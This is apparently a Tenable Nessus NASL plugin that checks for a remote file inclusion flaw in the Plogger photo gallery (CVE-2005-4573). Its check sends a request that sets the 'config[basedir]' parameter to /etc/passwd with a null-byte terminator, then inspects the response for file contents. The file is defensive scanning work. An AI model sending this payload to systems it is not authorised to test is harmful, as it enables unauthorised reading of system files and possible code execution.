#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20338);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-4573");
  script_bugtraq_id(15992);

  script_name(english:"Plogger plog-admin-functions.php config Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running Plogger, an open source photo
gallery written in PHP. 

The version of Plogger installed on the remote host fails to sanitize
user-supplied input to the 'config[basedir]' parameter of the
'admin/plog-admin-functions.php' script before using it in a PHP
'require_once' function.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit this flaw
to read arbitrary files on the remote host and or run arbitrary code,
possibly taken from third-party hosts, subject to the privileges of
the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.plogger.org/two-point-one/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Plogger 2.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/01/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/12/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:plogger:plogger");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/plogger", "/gallery", "/photos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  r = http_send_recv3(method:"GET", port: port,
    item:string(dir, "/admin/plog-admin-functions.php?", "config[basedir]=", file, "%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(pattern:"/etc/passwd.+failed to open stream", string:res) ||
    "Failed opening required '/etc/passwd" >< res
  ) {
    if (report_verbosity > 0) {
      res = data_protection::redact_etc_passwd(output:res);
      report = string(
        "\n",
        res
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
